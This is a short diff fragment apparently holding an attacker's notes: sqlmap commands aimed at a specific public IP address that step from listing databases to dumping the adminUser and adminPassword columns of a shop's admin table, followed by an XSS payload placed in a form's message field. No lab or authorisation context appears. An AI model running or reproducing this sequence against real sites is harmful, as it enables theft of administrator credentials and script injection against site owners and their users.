@@ -1,0 +1,14 @@
+         '/root/.local/share/sqlmap/output/13.50.135.82'
+sqlmap -u http://13.50.135.82/wishlist.php?delwlistid=12 --dbs
+http://13.50.135.82/details.php?proid=18
+/sqlmap -u 
+http://13.50.135.82/wishlist.php?delwlistid=12 -D db_shop --tables
+
+/sqlmap -u 
+http://13.50.135.82/wishlist.php?delwlistid=12 -D db_shop -T tbl_admin --columns
+
+/sqlmap -u 
+http://13.50.135.82/wishlist.php?delwlistid=12 -D db_shop -T tbl_admin -C adminUser,adminPassword --dump 
+
+
+message=<label>Gender</label> <select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select> <script>function show(){alert("XSSSelect");}</script> 
